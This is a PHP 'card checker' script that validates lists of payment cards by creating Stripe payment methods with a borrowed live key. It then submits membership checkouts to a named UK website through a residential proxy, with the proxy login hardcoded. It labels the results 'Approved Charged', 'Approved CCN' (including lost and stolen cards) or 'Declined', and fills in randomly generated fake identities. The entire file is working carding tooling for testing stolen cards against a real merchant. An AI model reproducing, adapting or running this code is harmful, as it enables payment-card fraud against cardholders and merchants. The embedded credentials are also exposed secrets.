<?php

error_reporting(1);   /////For hiding errors
set_time_limit(0);/////For Setting Time Limit
////////////////////////////===[Get Method]===////////////////////////////
function multiexplode($delimiters, $string)
{
  $one = str_replace($delimiters, $delimiters[0], $string);
  $two = explode($delimiters[0], $one);
  return $two;
}
$lista = $_GET['lista'];
$cc = multiexplode(array(":", "|", ""), $lista)[0];
$mes = multiexplode(array(":", "|", ""), $lista)[1];
$ano = multiexplode(array(":", "|", ""), $lista)[2];
$cvv = multiexplode(array(":", "|", ""), $lista)[3];
date_create_from_format('y', $ano);
function GetStr($string, $start, $end)
{
  $str = explode($start, $string);
  $str = explode($end, $str[1]);
  return $str[0];
}
////////////////////////////===[Randomizing Details Api]===////////////////////////////
$get = file_get_contents('https://randomuser.me/api/1.2/?nat=us');
preg_match_all("(\"first\":\"(.*)\")siU", $get, $matches1);
$name = $matches1[1][0];
preg_match_all("(\"last\":\"(.*)\")siU", $get, $matches1);
$last = $matches1[1][0];
preg_match_all("(\"email\":\"(.*)\")siU", $get, $matches1);
$email = $matches1[1][0];
preg_match_all("(\"street\":\"(.*)\")siU", $get, $matches1);
$street = $matches1[1][0];
preg_match_all("(\"city\":\"(.*)\")siU", $get, $matches1);
$city = $matches1[1][0];
preg_match_all("(\"state\":\"(.*)\")siU", $get, $matches1);
$state = $matches1[1][0];
preg_match_all("(\"phone\":\"(.*)\")siU", $get, $matches1);
$phone = $matches1[1][0];
preg_match_all("(\"postcode\":(.*),\")siU", $get, $matches1);
$postcode = $matches1[1][0];
////////////////////////////===[Bin Lookup Api]===////////////////////////////
$cctwo = substr("$cc", 0, 6);
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://lookup.binlist.net/'.$cctwo.'');
curl_setopt($ch, CURLOPT_USERAGENT, $user_agent);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Host: lookup.binlist.net',
'Cookie: _ga=GA1.2.549903363.1545240628; _gid=GA1.2.82939664.1545240628',
'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, '');
$fim = curl_exec($ch);
$fim = json_decode($fim,true);
$bank = $fim['bank']['name'];
$country = $fim['country']['alpha2'];
$type = $fim['type'];


////////////////////////////===[1Req]===////////////////////////////
$ch = curl_init();
$url = 'https://api.stripe.com/v1/payment_methods';
$post = 'type=card&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&guid=659a075d-90d7-4d3c-bba5-864c82083f5fcb35c3&muid=e6851f95-41ee-43aa-9807-16d3b56e8f223ed9f2&sid=2c23542b-7954-4e32-b95b-03a7f657c7685434c2&pasted_fields=number&payment_user_agent=stripe.js%2F5c7329bdd%3B+stripe-js-v3%2F5c7329bdd&time_on_page=64423&key=pk_live_jgJfosqlPQoVS4ozHc7KQnZz';
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_PROXY, 'la.residential.rayobyte.com:8000'); 
curl_setopt($ch, CURLOPT_PROXYUSERPWD, 'hackerng23_gmail_com:Nitin-121');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);  /////Folow when proxy applied
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);  /////Verify SSL Certificate
curl_setopt($ch, CURLOPT_COOKIESESSION, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS,  $post);  /////Get Post Fields
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_HTTPHEADER,  array(
 
  'Host: api.stripe.com',
  'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/110.0',
  'Referer: https://js.stripe.com/',
  'Content-Type: application/x-www-form-urlencoded',
  'Content-Length: '.strlen($post).'',/////Will make strlen to count the lenght itself
  'Origin: https://js.stripe.com',
  'Sec-Fetch-Site: same-site',
  'Te: trailers',
  'Connection: close',

));
$result = curl_exec($ch);
$resulta1 = json_decode($result, true);  /////for decoding result that we got in json
curl_close($ch);
//echo $result;  ////Will Also Give Full Response with message
$code = $resulta1['error']['code'];
$msg = $resulta1['error']['message'];

if ($code != "") {
    echo $code."\n";
    echo $msg;
    exit;
    }

////////////////////////////===[2nd Req]===////////////////////////////
$token = $resulta1['id'];
$ch = curl_init();
$url = 'https://serendipity-uk.com/connect/membership-account/membership-checkout/';
$post = 'level=1&checkjavascript=1&other_discount_code=&username='.$name.'&password=paacufdiajh%40eurokool.com&password2=paacufdiajh%40eurokool.com&bemail='.$email.'&bconfirmemail='.$email.'&fullname=&gateway=stripe&CardType=visa&discount_code=&tos=1&submit-checkout=1&javascriptok=1&submit-checkout=1&javascriptok=1&payment_method_id='.$token.'&AccountNumber='.$cc.'&ExpirationMonth='.$mes.'&ExpirationYear='.$ano.'';
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_PROXY, 'la.residential.rayobyte.com:8000'); 
curl_setopt($ch, CURLOPT_PROXYUSERPWD, 'hackerng23_gmail_com:Nitin-121');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);  /////Folow when proxy applied
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);  /////Verify SSL Certificate
curl_setopt($ch, CURLOPT_COOKIESESSION, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS,  $post);  /////Get Post Fields
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_HTTPHEADER,  array(

  'Host: serendipity-uk.com',
  'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/110.0',
  'Content-Type: application/x-www-form-urlencoded',
  'Content-Length: '.strlen($post).'',/////Will make strlen to count the lenght itself',
  'Origin: https://serendipity-uk.com',
  'Referer: https://serendipity-uk.com/connect/membership-account/membership-checkout/',
  'Upgrade-Insecure-Requests: 1',
  'Sec-Fetch-Site: same-origin',
  'Te: trailers',

));
$result = curl_exec($ch);
$resulta1 = json_decode($result, true);  /////for decoding result that we got in json
curl_close($ch);
//echo $result;   ////Will Also Give Full Response with message
//$code = $resulta1['error'];
//$message = $resulta1['err'];
//$declineCode = $resulta1['error']['decline_code'];
//echo $lista, "<b>-----Message:</b> $message";
//echo "<b>-----Error Code:</b> $code";
// Parse HTML code
$dom = new DOMDocument();
$dom->loadHTML($result);

// Find div element with id "pmpro_message"
$div_bs4 = $dom->getElementById('pmpro_message');

// Extract text content
if ($div_bs4) {
    $text = $div_bs4->textContent;
//    echo "Message: $text";
    $result = $text;
} else {
    echo "Could not find element with id 'pmpro_message'";
}
echo $result;

/////////////////////////////////////[Responses]//////////////////////////////////////
if(strpos($result, '/Thank_You')) {
  echo '<span class="badge badge-success">◈Approved Charged◈</span><span class="badge badge-primary">'.$lista.'</span> ◈ <span class="badge badge-info">◈Approved◈ Auth</span> </span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result, 'Thank You')){
  echo '<span class="badge badge-success">◈Approved Charged◈</span><span class="badge badge-primary">'.$lista.'</span><span class="badge badge-info">◈Approved◈ Auth</span> </span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result, '"message":"Purchase completed."')){
  echo '<span class="badge badge-success">◈Approved Charged◈</span><span class="badge badge-primary">'.$lista.'</span><span class="badge badge-info">◈Approved◈ Auth</span> </span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result, 'Thank You For Your Purchase.')){
  echo '<span class="badge badge-success">◈Approved Charged◈</span><span class="badge badge-primary">'.$lista.'</span><span class="badge badge-info">◈By @shadowasssistant◈ Auth</span> </span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result, '"status": "succeeded"')){
  echo '<span class="badge badge-success">◈Approved Charged◈</span><span class="badge badge-primary">'.$lista.'</span><span class="badge badge-info">◈By @shadowasssistant◈ Auth</span> </span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result, ': "succeeded"')){
  echo '<span class="badge badge-success">◈Approved Charged◈</span><span class="badge badge-primary">'.$lista.'</span><span class="badge badge-info">◈By @shadowasssistant◈ Auth</span> </span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result, 'status": "succeeded"')){
  echo '<span class="badge badge-success">◈Approved Charged◈</span><span class="badge badge-primary">'.$lista.'</span><span class="badge badge-info">◈By @shadowasssistant◈ Auth</span> </span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result, 'incorrect_cvc')){
  echo '<span class="badge badge-success">◈Approved CCN◈</span><span class="badge badge-success">'.$lista.'</span><span class="badge badge-info">◈By @shadowasssistant◈</span> </span> <span class="badge badge-info">'.$message.' 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result, 'insufficient_funds')){
  echo '<span class="badge badge-success">◈Approved Insuf Funds◈</span><span class="badge badge-primary">'.$lista.'</span><span class="badge badge-info">◈By @shadowasssistant◈</span> </span> <span class="badge badge-info">'.$message.' 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result, 'Your card has insufficient funds.')){
  echo '<span class="badge badge-success">◈Approved Insuf Funds◈</span><span class="badge badge-primary">'.$lista.'</span><span class="badge badge-info">◈By @shadowasssistant◈</span> </span> <span class="badge badge-info">'.$message.' 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result, '"cvc_check": "pass"')){
  echo '<span class="badge badge-success">◈Approved◈</span><span class="badge badge-primary">'.$lista.'</span><span class="badge badge-info">◈By @shadowasssistant◈</span> </span> <span class="badge badge-info">'.$message.' 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result, '"success":true')){
  echo '<span class="badge badge-success">◈Approved Charged◈</span><span class="badge badge-primary">'.$lista.'</span><span class="badge badge-info">◈By @shadowasssistant◈</span> </span> <span class="badge badge-info">'.$message.' 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result, 'Thank You.')){
  echo '<span class="badge badge-success">◈Approved Charged◈</span><span class="badge badge-primary">'.$lista.'</span><span class="badge badge-info">◈By @shadowasssistant◈</span> </span> <span class="badge badge-info">'.$message.' 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result, '"status": "succeeded"')){
  echo '<span class="badge badge-success">◈Approved Charged◈</span><span class="badge badge-primary">'.$lista.'</span><span class="badge badge-info">◈By @shadowasssistant◈</span> </span> <span class="badge badge-info">'.$message.' 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result, 'Your card zip code is incorrect.')){
  echo '<span class="badge badge-success">◈Approved◈</span><span class="badge badge-primary">'.$lista.'</span><span class="badge badge-info">◈By @shadowasssistant◈</span> </span> <span class="badge badge-info">'.$message.' 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result, 'incorrect_zip')){
  echo '<span class="badge badge-success">◈Approved◈</span><span class="badge badge-primary">'.$lista.'</span><span class="badge badge-info">◈By @shadowasssistant◈</span> </span> <span class="badge badge-info">'.$message.' 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result, 'Success')){
  echo '<span class="badge badge-success">◈Approved Charged◈</span><span class="badge badge-primary">'.$lista.'</span><span class="badge badge-info">◈By @shadowasssistant◈</span> </span> <span class="badge badge-info">'.$message.' 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result, 'succeeded.')){
  echo '<span class="badge badge-success">◈Approved Charged◈</span><span class="badge badge-primary">'.$lista.'</span><span class="badge badge-info">◈By @shadowasssistant◈</span> </span> <span class="badge badge-info">'.$message.' 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result, '"type":"one-time"')){
  echo '<span class="badge badge-success">◈Approved◈</span><span class="badge badge-primary">'.$lista.'</span><span class="badge badge-info">◈By @shadowasssistant◈</span> </span> <span class="badge badge-info">'.$message.' 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result, 'lost_card')){
  echo '<span class="badge badge-success">◈Approved CCN◈</span><span class="badge badge-primary">'.$lista.'</span><span class="badge badge-info">◈By @shadowasssistant◈</span> </span> <span class="badge badge-info">'.$message.' 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result, 'stolen_card')){
  echo '<span class="badge badge-success">◈Approved CCN◈</span><span class="badge badge-primary">'.$lista.'</span><span class="badge badge-info">◈By @shadowasssistant◈</span> </span> <span class="badge badge-info">'.$message.' 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result, 'security code is invalid.')){
  echo '<span class="badge badge-success">◈Approved CCN◈</span><span class="badge badge-primary">'.$lista.'</span><span class="badge badge-info">◈'.$mesto.'◈</span> </span> <span class="badge badge-info">'.$message.' 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result, '"error":"Your card\s security code is incorrect."')){
  echo '<span class="badge badge-success">◈Approved CCN◈</span><span class="badge badge-primary">'.$lista.'</span><span class="badge badge-info">◈'.$mesto.'◈</span> </span> <span class="badge badge-info">'.$message.' 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result, 'Your card\s security code is incorrect.')){
  echo '<span class="badge badge-success">◈Approved CCN◈</span><span class="badge badge-primary">'.$lista.'</span><span class="badge badge-info">◈'.$mesto.'◈</span> </span> <span class="badge badge-info">'.$message.' 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result, 'security code is incorrect.')){
  echo '<span class="badge badge-success">◈Approved CCN◈</span><span class="badge badge-primary">'.$lista.'</span><span class="badge badge-info">◈By @shadowasssistant◈</span> </span> <span class="badge badge-info">'.$message.' 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result, 'pickup_card')){
  echo '<span class="badge badge-success">◈Approved CCN◈</span><span class="badge badge-primary">'.$lista.'</span><span class="badge badge-info">◈By @shadowasssistant◈</span> </span> <span class="badge badge-info">'.$message.' 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
elseif(strpos($result, 'Your card number is incorrect.')){
  echo '<span class="badge badge-danger">◈Declined◈</span><span class="badge badge-info">'.$lista.'</span><span class="badge badge-info">◈'.$mesto.'◈</span> </span> <span class="badge badge-info">'.$message.' 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result, 'Your card was declined.')){
  echo '<span class="badge badge-danger">◈Declined◈</span><span class="badge badge-info">'.$lista.'</span><span class="badge badge-info">◈'.$mesto.'◈</span> </span> <span class="badge badge-info">「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result, 'Payment cannot be processed, missing credit card number.')){
  echo '<span class="badge badge-danger">◈Declined◈</span><span class="badge badge-info">'.$lista.'</span><span class="badge badge-info">◈Missing CC Number◈</span> </span> <span class="badge badge-info">'.$message.' 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result, 'missing_payment_information')){
  echo '<span class="badge badge-danger">◈Declined◈</span><span class="badge badge-info">'.$lista.'</span><span class="badge badge-info">◈Missing CC Number◈</span> </span> <span class="badge badge-info">'.$message.' 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result, 'Card is declined by your bank, please contact them for additional information.')){
  echo '<span class="badge badge-danger">◈Declined◈</span><span class="badge badge-info">'.$lista.'</span><span class="badge badge-info">◈Declined By Bank◈</span> </span> <span class="badge badge-info">'.$message.' 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result, 'three_d_secure_redirect')){
  echo '<span class="badge badge-danger">◈Declined◈</span><span class="badge badge-info">'.$lista.'</span><span class="badge badge-info">◈VBV◈</span> </span> <span class="badge badge-info">'.$message.' 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result, 'transaction_not_allowed')){
  echo '<span class="badge badge-danger">◈Declined◈</span><span class="badge badge-info">'.$lista.'</span><span class="badge badge-info">◈Transaction Is Not Allowed◈</span> </span> <span class="badge badge-info">'.$message.' 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result, 'lock_timeout')){
  echo '<span class="badge badge-danger">◈Declined◈</span><span class="badge badge-info">'.$lista.'</span><span class="badge badge-info">◈Timeout◈</span> </span> <span class="badge badge-info">'.$message.' 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result, 'parameter_invalid_empty')){
  echo '<span class="badge badge-danger">◈Declined◈</span><span class="badge badge-info">'.$lista.'</span><span class="badge badge-info">◈Invalid Or Empty◈</span> </span> <span class="badge badge-info">'.$message.' 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result, '"cvc_check": "fail"')){
  echo '<span class="badge badge-danger">◈Declined◈</span><span class="badge badge-info">'.$lista.'</span><span class="badge badge-info">◈By @shadowasssistant◈</span> </span> <span class="badge badge-info">'.$message.' 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result, 'generic_decline')){
  echo '<span class="badge badge-danger">◈Declined◈</span><span class="badge badge-info">'.$lista.'</span><span class="badge badge-info">◈Generic Decline◈</span> </span> <span class="badge badge-info">'.$message.' 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result, '"error": { "code": "card_declined", "decline_code": "generic_decline", "doc_url": "https://stripe.com/docs/error-codes/card-declined", "message": "Your card was declined.", "param": "", "type": "card_error" }')){
  echo '<span class="badge badge-danger">◈Declined◈</span><span class="badge badge-info">'.$lista.'</span><span class="badge badge-info">◈Generic Decline◈</span> </span> <span class="badge badge-info">'.$message.' 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result, 'do_not_honor')){
  echo '<span class="badge badge-danger">◈Declined◈</span><span class="badge badge-info">'.$lista.'</span><span class="badge badge-info">◈Do Not Honor◈</span> </span> <span class="badge badge-info">'.$message.' 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result, 'service_not_allowed')){
  echo '<span class="badge badge-danger">◈Declined◈</span><span class="badge badge-info">'.$lista.'</span><span class="badge badge-info">◈By @shadowasssistant◈</span> </span> <span class="badge badge-info">'.$message.' 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result, 'incorrect_number')){
  echo '<span class="badge badge-danger">◈Declined◈</span><span class="badge badge-info">'.$lista.'</span><span class="badge badge-info">◈Incorrect Number(Don,t Check Genrated CCs)◈</span> </span> <span class="badge badge-info">'.$message.' 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result, '"decline_code": "generic_decline"')){
  echo '<span class="badge badge-danger">◈Declined◈</span><span class="badge badge-info">'.$lista.'</span><span class="badge badge-info">◈Generic Decline◈</span> </span> <span class="badge badge-info">'.$message.' 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result, 'expired_card')){
  echo '<span class="badge badge-danger">◈Declined◈</span><span class="badge badge-info">'.$lista.'</span><span class="badge badge-info">◈'.$mesto.'◈</span> </span> <span class="badge badge-info">'.$message.' 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result, '"message": "Your card\s expiration month is invalid."')){
  echo '<span class="badge badge-danger">◈Declined◈</span><span class="badge badge-info">'.$lista.'</span><span class="badge badge-info">◈'.$mesto.'◈</span> </span> <span class="badge badge-info">'.$message.' 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result, 'Your card has expired.')){
  echo '<span class="badge badge-danger">◈Declined◈</span><span class="badge badge-info">'.$lista.'</span><span class="badge badge-info">◈'.$mesto.'◈</span> </span> <span class="badge badge-info">'.$message.' 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result, 'fraudulent')){
  echo '<span class="badge badge-danger">◈Declined◈</span><span class="badge badge-info">'.$lista.'</span><span class="badge badge-info">◈Fraudlent◈</span> </span> <span class="badge badge-info">'.$message.' 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
else {
  echo '<span class="badge badge-danger">◈Declined◈</span></span> <span class="badge badge-info">'.$lista.'</span><span class="badge badge-info">◈Unknown Response</span> </span> <span class="badge badge-info">'.$message.' 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}





?>